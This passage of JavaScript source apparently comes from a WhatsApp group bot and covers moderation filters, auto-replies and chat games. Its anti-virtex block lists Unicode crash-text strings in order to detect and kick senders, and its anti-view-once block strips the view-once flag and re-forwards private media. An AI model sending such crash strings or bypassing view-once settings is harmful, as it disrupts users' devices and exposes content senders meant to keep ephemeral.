        resolve(xeonyresult);
      });
    }

    //limit func
    async function useLimit(senuseLimitder, amount) {
      db.data.users[sender].limit -= amount;
      db.data.users[sender].totalLimit += amount;
      replygcXlicon(
        `*_You have used up: ${amount} limit_*\n*_Remaining: ${db.data.users[sender].limit} limit_*`
      );
    }
    async function resetLimit() {
      let users = Object.keys(global.db.data.users);
      let Limitxeon = isPremium ? limit.prem : limit.free;
      for (let i of users) {
        db.data.users[i].limit = Limitxeon;
      }
      XliconBotInc.sendText("120363167338947238@g.us", { text: `Reset Limit` });
    }
    // Grup Only
    if (!m.isGroup && !XeonTheCreator && db.data.settings[botNumber].onlygrub) {
      if (isCommand) {
        return replygcXlicon(
          `*_Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !_*\n\n*_If you have issue please chat owner wa.me/${ownernumber}_*`
        );
      }
    }
    // Private Only
    if (!XeonTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
      if (isCommand) {
        return replygcXlicon(
          "*_Hello buddy! if you want to use this bot, please chat the bot in private chat_*"
        );
      }
    }

    if (!XliconBotInc.public) {
      if (XeonTheCreator && !m.key.fromMe) return;
    }
    if (db.data.settings[botNumber].online) {
      if (isCommand) {
        XliconBotInc.sendPresenceUpdate("unavailable", from);
      }
    }
    if (db.data.settings[botNumber].autoread) {
      XliconBotInc.readMessages([m.key]);
    }
    //auto set bio\\
    if (db.data.settings[botNumber].autobio) {
      XliconBotInc.updateProfileStatus(
        `${botname} 📃 𝐇𝐚𝐯𝐞 𝐁𝐞𝐞𝐧 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 💻 ${runtime(
          process.uptime()
        )}...                                   ~𝐒𝐓𝐀𝐑 ⭐ 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐑𝐞𝐩𝐨𝐬𝐢𝐭𝐨𝐫𝐲 𝐎𝐧 𝐆𝐢𝐭𝐇𝐮𝐛...                       🏮 © Xʟɪᴄᴏɴ-Iɴᴄ
     `
      ).catch((_) => _);
    }
    //auto type record
    if (db.data.settings[botNumber].autorecordtype) {
      if (isCommand) {
        let xeonmix = ["composing", "recording"];
        xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())];
        XliconBotInc.sendPresenceUpdate(xeonmix2, from);
      }
    }
    if (db.data.settings[botNumber].autorecord) {
      if (isCommand) {
        let xeonmix = ["recording"];
        xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())];
        XliconBotInc.sendPresenceUpdate(xeonmix2, from);
      }
    }
    if (db.data.settings[botNumber].autotype) {
      if (isCommand) {
        let xeonpos = ["composing"];
        XliconBotInc.sendPresenceUpdate(xeonpos, from);
      }
    }

    //auto block number
    if (
      m.sender.startsWith(`${autoblocknumber}`) &&
      db.data.settings[botNumber].autoblocknum === true
    ) {
      return XliconBotInc.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith("91") &&
      db.data.settings[botNumber].onlyindia === true
    ) {
      return XliconBotInc.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith("62") &&
      db.data.settings[botNumber].onlyindo === true
    ) {
      return XliconBotInc.updateBlockStatus(m.sender, "block");
    }
    if (
      !m.sender.startsWith(`${antiforeignnumber}`) &&
      db.data.chats[m.chat].antiforeignnum === true
    ) {
      if (XeonTheCreator || isAdmins || !isBotAdmins) return;
      XliconBotInc.sendMessage(
        m.chat,
        {
          text: `*_Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group_*`,
        },
        { quoted: m }
      );
      await sleep(2000);
      await XliconBotInc.groupParticipantsUpdate(m.chat, [m.sender], "remove");
    }
    let list = [];
    for (let i of owner) {
      list.push({
        displayName: await XliconBotInc.getName(i),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XliconBotInc.getName(
          i
        )}\nFN:${await XliconBotInc.getName(
          i
        )}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    //console log
    if (isCommand) {
      console.log(
        color(
          `\n< ================================================== >\n`,
          "cyan"
        )
      );
      console.log(
        chalk.black(chalk.bgWhite(!isCommand ? "[ MESSAGE ]" : "[ COMMAND ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
          "\n" +
          chalk.magenta("=> From"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
        chalk.green(m.isGroup ? pushname : "Private Chat", m.chat)
      );
      global.db.data.settings[botNumber].totalhit += 1;
    }

    //antiviewonce
    if (
      db.data.chats[m.chat].antiviewonce &&
      m.isGroup &&
      m.mtype == "viewOnceMessageV2"
    ) {
      let val = { ...m };
      let msg =
        val.message?.viewOnceMessage?.message ||
        val.message?.viewOnceMessageV2?.message;
      delete msg[Object.keys(msg)[0]].viewOnce;
      val.message = msg;
      await XliconBotInc.sendMessage(m.chat, { forward: val }, { quoted: m });
    }
    //ANTI VIRUS
    if (isGroup && db.data.chats[m.chat].antivirtex) {
      if (
        budy.includes("๒๒๒๒") ||
        budy.includes("ดุ") ||
        budy.includes("ผิดุท้เึางืผิดุท้เึางื") ||
        budy.includes("๑๑๑๑๑๑๑๑") ||
        budy.includes("৭৭৭৭৭৭৭৭") ||
        budy.includes("   ⃢   ⃢   ⃢  ") ||
        budy.includes(
          "*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟"
        ) ||
        budy.includes("ผดิทุเ้ึางผืดิทุเ้") ||
        budy.includes(".*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*") ||
        budy.includes("᥋") ||
        budy.includes("؁") ||
        budy.includes("ٯٯٯٯٯ")
      ) {
        if (isGroupAdmins) return replygcXlicon("*VIRTEX DETECTED*");
        console.log(
          color("[KICK]", "red"),
          color("Received a virus text!", "yellow")
        );
        XliconBotInc.sendText(
          m.chat,
          `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${
            sender.split("@")[0]
          }`
        );
        if (!isBotAdmins) return;
        if (XeonTheCreator) return;
        XliconBotInc.groupParticipantsUpdate(from, [sender], "remove");
        await XliconBotInc.sendMessage(from, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XliconBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`, {
          text: `Hi Owner! wa.me/${
            sender.split("@")[0]
          } Detected Having Sent Virtex ${isGroup ? `in ${groupName}` : ""}`,
        });
      }
    }

    if (db.data.chats[m.chat].antibot) {
      if (m.isBaileys && m.fromMe == false) {
        if (isAdmin || !isBotAdmin) {
        } else {
          replygcXlicon(
            `*Another Bot Detected*\n\nHusshhh Get away from this group!!!`
          );
          return await XliconBotInc.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
        }
      }
    }

    //anti media
    if (db.data.chats[m.chat].antimedia && isMedia) {
      if (XeonTheCreator || isAdmins || !isBotAdmins) {
      } else {
        replygcXlicon(
          `\`\`\`「 Media Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-media for this group_*`
        );
        return XliconBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
      }
    }
    if (db.data.chats[m.chat].image && isXliconMedia) {
      if (isXliconMedia === "imageMessage") {
        if (XeonTheCreator || isAdmins || !isBotAdmins) {
        } else {
          replygcXlicon(
            `\`\`\`「 Image Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-image for this group_*`
          );
          return XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antivideo && isXliconMedia) {
      if (isXliconMedia === "videoMessage") {
        if (XeonTheCreator || isAdmins || !isBotAdmins) {
        } else {
          replygcXlicon(
            `\`\`\`「 Video Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-video for this group_*`
          );
          return XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antisticker && isXliconMedia) {
      if (isXliconMedia === "stickerMessage") {
        if (XeonTheCreator || isAdmins || !isBotAdmins) {
        } else {
          replygcXlicon(
            `\`\`\`「 Sticker Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group_*`
          );
          return XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antiaudio && isXliconMedia) {
      if (isXliconMedia === "audioMessage") {
        if (XeonTheCreator || isAdmins || !isBotAdmins) {
        } else {
          replygcXlicon(
            `\`\`\`「 Audio Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-audio for this group_*`
          );
          return XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antipoll && isXliconMedia) {
      if (isXliconMedia === "pollCreationMessage") {
        if (XeonTheCreator || isAdmins || !isBotAdmins) {
        } else {
          replygcXlicon(
            `\`\`\`「 Poll Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-poll for this group_*`
          );
          return XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antilocation && isXliconMedia) {
      if (isXliconMedia === "locationMessage") {
        if (XeonTheCreator || isAdmins || !isBotAdmins) {
        } else {
          replygcXlicon(
            `\`\`\`「 Location Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-location for this group_*`
          );
          return XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].antidocument && isXliconMedia) {
      if (isXliconMedia === "documentMessage") {
        if (XeonTheCreator || isAdmins || !isBotAdmins) {
        } else {
          replygcXlicon(
            `\`\`\`「 Document Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-document for this group_*`
          );
          return XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    if (db.data.chats[m.chat].anticontact && isXliconMedia) {
      if (isXliconMedia === "contactMessage") {
        if (XeonTheCreator || isAdmins || !isBotAdmins) {
        } else {
          replygcXlicon(
            `\`\`\`「 Contact Detected 」\`\`\`\n\n*_Sorry, but I have to delete it, because the admin/owner has activated anti-contact for this group_*`
          );
          return XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
        }
      }
    }
    //respond
    if (db.data.chats[m.chat].badword) {
      for (let bak of bad) {
        if (budy === bak) {
          let baduser = await db.data.users[sender].badword;
          XliconBotInc.sendMessage(m.chat, {
            delete: {
              remoteJid: m.chat,
              fromMe: false,
              id: m.key.id,
              participant: m.key.participant,
            },
          });
          XliconBotInc.sendMessage(
            from,
            {
              text: `\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${
                m.sender.split("@")[0]
              } *_was using harsh words and his chat has been deleted_*`,
              contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
          );
        }
      }
    }
    //autosticker
    if (db.data.settings[botNumber].autosticker) {
      if (m.key.fromMe) return;
      if (/image/.test(mime) && !/webp/.test(mime)) {
        let mediac = await quoted.download();
        XliconBotInc.sendImageAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
        console.log(`Auto sticker detected`);
      } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return;
        let mediac = await quoted.download();
        XliconBotInc.sendVideoAsSticker(from, mediac, m, {
          packname: global.packname,
          author: global.author,
        });
      }
    }

    if (db.data.chats[m.chat].antilinkgc) {
      if (budy.match(`chat.whatsapp.com`)) {
        bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\n*_Admin has sent a gc link, admin is free to send any link😇_*`;
        if (isAdmins) return replygcXlicon(bvl);
        if (m.key.fromMe) return replygcXlicon(bvl);
        if (XeonTheCreator) return replygcXlicon(bvl);
        await XliconBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XliconBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 GC Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } *_has sent a link and successfully deleted_*`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    if (db.data.chats[m.chat].antilink) {
      if (budy.match("http") && budy.match("https")) {
        bvl = `\`\`\`「 Link Detected 」\`\`\`\n\n*_Admin has sent a link, admin is free to send any link😇_*`;
        if (isAdmins) return replygcXlicon(bvl);
        if (m.key.fromMe) return replygcXlicon(bvl);
        if (XeonTheCreator) return replygcXlicon(bvl);
        await XliconBotInc.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant,
          },
        });
        XliconBotInc.sendMessage(
          from,
          {
            text: `\`\`\`「 Link Detected 」\`\`\`\n\n@${
              m.sender.split("@")[0]
            } *_has sent a link and successfully deleted_*`,
            contextInfo: { mentionedJid: [m.sender] },
          },
          { quoted: m }
        );
      }
    }
    //afk
    let mentionUser = [
      ...new Set([
        ...(m.mentionedJid || []),
        ...(m.quoted ? [m.quoted.sender] : []),
      ]),
    ];
    for (let jid of mentionUser) {
      let user = db.data.users[jid];
      if (!user) continue;
      let afkTime = user.afkTime;
      let nick = user.nick;
      if (!afkTime || afkTime < 0) continue;
      let afkDuration = formatAfkDuration(new Date() - user.afkTime);
      let reason = user.afkReason || "";
      replygcXlicon(
        `Don't Mention.. *${nick}* is currently AFK ${
          reason ? "for: " + reason : reason
        }\nAFK Since \`${afkDuration}\``
      );
    }
    if (db.data.users[m.sender].afkTime > -1) {
      let user = global.db.data.users[m.sender];
      let afkDuration = formatAfkDuration(new Date() - user.afkTime);

      replygcXlicon(`Welcome back...\nYou were away for: \`${afkDuration}\``);

      user.afkTime = -1;
      user.afkReason = "";
    }

    //total features
    const Xliconfeature = () => {
      var mytext = fs.readFileSync("./XLICON-V3.js").toString();
      var numUpper = (mytext.match(/case "/g) || []).length;
      return numUpper;
    };
    //autoreply
    for (let BhosdikaXeon of VoiceNoteXeon) {
      if (budy === BhosdikaXeon) {
        let audiobuffy = fs.readFileSync(
          `./XliconMedia/audio/${BhosdikaXeon}.mp3`
        );
        XliconBotInc.sendMessage(
          m.chat,
          { audio: audiobuffy, mimetype: "audio/mp4", ptt: true },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaXeon of StickerXeon) {
      if (budy === BhosdikaXeon) {
        let stickerbuffy = fs.readFileSync(
          `./XliconMedia/sticker/${BhosdikaXeon}.webp`
        );
        XliconBotInc.sendMessage(
          m.chat,
          { sticker: stickerbuffy },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaXeon of ImageXeon) {
      if (budy === BhosdikaXeon) {
        let imagebuffy = fs.readFileSync(
          `./XliconMedia/image/${BhosdikaXeon}.jpg`
        );
        XliconBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m });
      }
    }
    for (let BhosdikaXeon of VideoXeon) {
      if (budy === BhosdikaXeon) {
        let videobuffy = fs.readFileSync(
          `./XliconMedia/video/${BhosdikaXeon}.mp4`
        );
        XliconBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m });
      }
    }

    const sendapk = (teks) => {
      XliconBotInc.sendMessage(
        from,
        { document: teks, mimetype: "application/vnd.android.package-archive" },
        { quoted: m }
      );
    };
    for (let BhosdikaXeon of ApkXeon) {
      if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./XliconMedia/apk/${BhosdikaXeon}.apk`);
        sendapk(buffer);
      }
    }

    const sendzip = (teks) => {
      XliconBotInc.sendMessage(
        from,
        { document: teks, mimetype: "application/zip" },
        { quoted: m }
      );
    };
    for (let BhosdikaXeon of ZipXeon) {
      if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./XliconMedia/zip/${BhosdikaXeon}.zip`);
        sendzip(buffer);
      }
    }

    const senddocu = (teks) => {
      XliconBotInc.sendMessage(
        from,
        { document: teks, mimetype: "application/pdf" },
        { quoted: m }
      );
    };
    for (let BhosdikaXeon of DocXeon) {
      if (budy === BhosdikaXeon) {
        let buffer = fs.readFileSync(`./XliconMedia/doc/${BhosdikaXeon}.pdf`);
        senddocu(buffer);
      }
    }

    // Respon Cmd with media
    if (
      isMedia &&
      m.msg.fileSha256 &&
      m.msg.fileSha256.toString("base64") in global.db.data.sticker
    ) {
      let hash = global.db.data.sticker[m.msg.fileSha256.toString("base64")];
      let { text, mentionedJid } = hash;
      let messages = await generateWAMessage(
        m.chat,
        { text: text, mentions: mentionedJid },
        {
          userJid: XliconBotInc.user.id,
          quoted: m.quoted && m.quoted.fakeObj,
        }
      );
      messages.key.fromMe = areJidsSameUser(m.sender, XliconBotInc.user.id);
      messages.key.id = m.key.id;
      messages.pushName = m.pushName;
      if (m.isGroup) messages.participant = m.sender;
      let msg = {
        ...chatUpdate,
        messages: [proto.WebMessageInfo.fromObject(messages)],
        type: "append",
      };
      XliconBotInc.ev.emit("messages.upsert", msg);
    }

    //math
    if (kuismath.hasOwnProperty(m.sender.split("@")[0]) && isCmd2) {
      if (m.key.fromMe) return;
      kuis = true;
      jawaban = kuismath[m.sender.split("@")[0]];
      if (budy.toLowerCase() == jawaban) {
        await replygcXlicon(
          `*_🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode_*`
        );
        delete kuismath[m.sender.split("@")[0]];
      } else replygcXlicon("*Wrong Answer!*");
    }

    //game
    this.game = this.game ? this.game : {};
    let room = Object.values(this.game).find(
      (room) =>
        room.id &&
        room.game &&
        room.state &&
        room.id.startsWith("tictactoe") &&
        [room.game.playerX, room.game.playerO].includes(m.sender) &&
        room.state == "PLAYING"
    );
    if (room) {
      let ok;
      let isWin = !1;
      let isTie = !1;
      let isSurrender = !1;
      // replygcXlicon(`[DEBUG]\n${parseInt(m.text)}`)
      if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return;
      isSurrender = !/^[1-9]$/.test(m.text);
      if (m.sender !== room.game.currentTurn) {
        if (!isSurrender) return !0;
      }
      if (
        !isSurrender &&
        1 >
          (ok = room.game.turn(
            m.sender === room.game.playerO,
            parseInt(m.text) - 1
          ))
      ) {
        replygcXlicon(
          {
            "-3": "The game is over",
            "-2": "Invalid",
            "-1": "Invalid Position",
            0: "Invalid Position",
          }[ok]
        );
        return !0;
      }
      if (m.sender === room.game.winner) isWin = true;
      else if (room.game.board === 511) isTie = true;
      let arr = room.game.render().map((v) => {
        return {
          X: "❌",
          O: "⭕",
          1: "1️⃣",
          2: "2️⃣",
          3: "3️⃣",
          4: "4️⃣",
          5: "5️⃣",
          6: "6️⃣",
          7: "7️⃣",
          8: "8️⃣",
          9: "9️⃣",
        }[v];
      });
      if (isSurrender) {
        room.game._currentTurn = m.sender === room.game.playerX;
        isWin = true;
      }
      let winner = isSurrender ? room.game.currentTurn : room.game.winner;
      let str = `Room ID: ${room.id}

${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}

${
  isWin
    ? `@${winner.split("@")[0]} Won!`
    : isTie
    ? `Game over`
    : `Turn ${["❌", "⭕"][1 * room.game._currentTurn]} (@${
        room.game.currentTurn.split("@")[0]
      })`
}
❌: @${room.game.playerX.split("@")[0]}
⭕: @${room.game.playerO.split("@")[0]}

Type *surrender* to surrender and admit defeat`;
      if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
        room[room.game._currentTurn ^ isSurrender ? "x" : "o"] = m.chat;
      if (room.x !== room.o)
        XliconBotInc.sendText(room.x, str, m, {
          mentions: parseMention(str),
        });
      XliconBotInc.sendText(room.o, str, m, {
        mentions: parseMention(str),
      });
      if (isTie || isWin) {
        delete this.game[room.id];
      }
    }

    //RPS
    this.suit = this.suit ? this.suit : {};
    let roof = Object.values(this.suit).find(
      (roof) => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender)
    );
    if (roof) {
      let win = "";
      let tie = false;
      if (
        m.sender == roof.p2 &&
        /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(
          m.text
        ) &&
        m.isGroup &&
        roof.status == "wait"
      ) {
        if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
          XliconBotInc.sendTextWithMentions(
            m.chat,
            `@${roof.p2.split`@`[0]} rejected the challange, what a loser.`,
            m
          );
          delete this.suit[roof.id];
          return !0;
        }
        roof.status = "play";
        roof.asal = m.chat;
        clearTimeout(roof.waktu);
        //delete roof[roof.id].waktu
        XliconBotInc.sendText(
          m.chat,
          `Game has been sent in DMs

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose an option in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`,
          m,
          { mentions: [roof.p, roof.p2] }
        );
        if (!roof.pilih)
          XliconBotInc.sendText(
            roof.p,
            `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`,
            m
          );
        if (!roof.pilih2)
          XliconBotInc.sendText(
            roof.p2,
            `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`,
            m
          );
        roof.waktu_milih = setTimeout(() => {
          if (!roof.pilih && !roof.pilih2)
            XliconBotInc.sendText(
              m.chat,
              `Both Players Don't Want To Play,\nGame Canceled`
            );
          else if (!roof.pilih || !roof.pilih2) {
            win = !roof.pilih ? roof.p2 : roof.p;
            XliconBotInc.sendTextWithMentions(
              m.chat,
              `@${
                (roof.pilih ? roof.p2 : roof.p).split`@`[0]
              } Didn't Choose an Option, Game Over!`,
              m
            );
          }
          delete this.suit[roof.id];
          return !0;
        }, roof.timeout);
      }
      let jwb = m.sender == roof.p;
      let jwb2 = m.sender == roof.p2;
      let g = /scissors/i;
      let b = /rock/i;
      let k = /paper/i;
      let reg = /^(scissors|rock|paper)/i;
      if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
        roof.pilih = reg.exec(m.text.toLowerCase())[0];
        roof.text = m.text;
        replygcXlicon(
          `_You have chosen_ ${m.text} ${
            !roof.pilih2 ? `\n\n*_Waiting for the opponent to choose_*` : ""
          }`
        );
        if (!roof.pilih2)
          XliconBotInc.sendText(
            roof.p2,
            "_The opponent has chosen_\nNow it is your turn",
            0
          );
      }
      if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
        roof.pilih2 = reg.exec(m.text.toLowerCase())[0];
        roof.text2 = m.text;
        replygcXlicon(
          `_You have chosen_ ${m.text} ${
            !roof.pilih ? `\n\n*_Waiting for the opponent to choose_*` : ""
          }`
        );
        if (!roof.pilih)
          XliconBotInc.sendText(
            roof.p,
            "_The opponent has chosen_\nNow it is your turn",
            0
          );
      }
      let stage = roof.pilih;
      let stage2 = roof.pilih2;
      if (roof.pilih && roof.pilih2) {
        clearTimeout(roof.waktu_milih);
        if (b.test(stage) && g.test(stage2)) win = roof.p;
        else if (b.test(stage) && k.test(stage2)) win = roof.p2;
        else if (g.test(stage) && k.test(stage2)) win = roof.p;
        else if (g.test(stage) && b.test(stage2)) win = roof.p2;
        else if (k.test(stage) && b.test(stage2)) win = roof.p;
        else if (k.test(stage) && g.test(stage2)) win = roof.p2;
        else if (stage == stage2) tie = true;
        XliconBotInc.sendText(
          roof.asal,
          `_*Game Result*_${tie ? "\nTIE" : ""}

@${roof.p.split`@`[0]} (${roof.text}) ${
            tie ? "" : roof.p == win ? ` Win \n` : ` Lost \n`
          }
@${roof.p2.split`@`[0]} (${roof.text2}) ${
            tie ? "" : roof.p2 == win ? ` Win \n` : ` Lost  \n`
          }
`.trim(),
          m,
          { mentions: [roof.p, roof.p2] }
        );
        delete this.suit[roof.id];
      }
    } //end

    //user db
    if (isCommand && !isUser) {
      xeonverifieduser.push(sender);
      fs.writeFileSync(
        "./src/data/role/user.json",
        JSON.stringify(xeonverifieduser, null, 2)
      );
    }

    switch (isCommand) {
      case "addbadword":
      case "addbd":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!groupAdmins) return replygcXlicon(mess.admin);
        if (args.length < 1)
          return replygcXlicon(
            `*_Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole_*`
          );
        bad.push(q);
        fs.writeFileSync(
          "./src/data/function/badword.json",
          JSON.stringify(bad)
        );
        replygcXlicon("Successfully Added Bad Word!");
        break;
      case "delbadword":
      case "deldb":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!groupAdmins) return replygcXlicon(mess.admin);
        if (args.length < 1)
          return replygcXlicon(
            `*_Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole_*`
          );
        bad.splice(q);
        fs.writeFileSync(
          "./src/data/function/badword.json",
          JSON.stringify(bad)
        );
        replygcXlicon("*_Successfully Deleted Bad Word!_*");
        break;
      case "resetuser":
      case "resetdbuser":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let totalusernya = db.data.users[0];
          replygcXlicon(
            `*_Succesfully Deleted ${totalusernya} Users in Database_*`
          );
